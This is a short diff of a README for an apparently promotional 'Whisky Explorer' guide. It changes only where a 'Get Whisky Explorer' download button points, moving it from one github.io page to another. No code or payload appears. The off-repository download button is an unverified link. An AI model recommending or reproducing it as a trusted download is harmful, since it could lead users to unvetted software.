@@ -21,7 +21,7 @@ To begin exploring **Whisky tasting notes**, using this **Single malt Whisky gui
 | :--- | :--- |
 | **Get Whisky Explorer** | Click the button below to start using this complete Whisky knowledge suite. |
 
-[![Button](https://img.shields.io/badge/🥃-Get_Whisky_Explorer-2ea44f?style=for-the-badge)](https://allenwilliam9855874.github.io/.github/whisky-investment-tips)
+[![Button](https://img.shields.io/badge/🥃-Get_Whisky_Explorer-2ea44f?style=for-the-badge)](https://community-driven-tools-hub.github.io/.github/whisky-investment-tips)
 
 ## System Requirements
 
